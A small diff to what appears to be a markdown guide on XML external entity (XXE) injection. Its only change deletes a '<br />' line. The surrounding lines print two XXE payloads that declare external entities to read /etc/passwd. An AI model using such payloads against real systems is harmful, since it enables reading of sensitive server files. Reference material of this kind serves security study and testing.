@@ -24,8 +24,6 @@ If the last command was useful we can now try to report critical files using Wra
 <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
 ```
 
-<br />
-
 ```xml
 <!DOCTYPE foo [<!ENTITY showFile SYSTEM "file:///etc/passwd"> ]>
 ```
